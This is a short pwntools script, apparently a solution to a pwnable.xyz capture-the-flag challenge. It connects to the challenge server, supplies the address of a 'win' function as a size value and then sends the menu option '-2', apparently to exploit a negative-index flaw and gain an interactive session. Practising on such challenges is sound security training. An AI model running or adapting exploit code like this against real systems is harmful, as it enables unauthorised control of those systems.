#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30007)
elf = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
win = elf.symbols['_']

#gdb.attach(p)

p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(win))

p.sendlineafter("> ", '-2')

p.interactive()

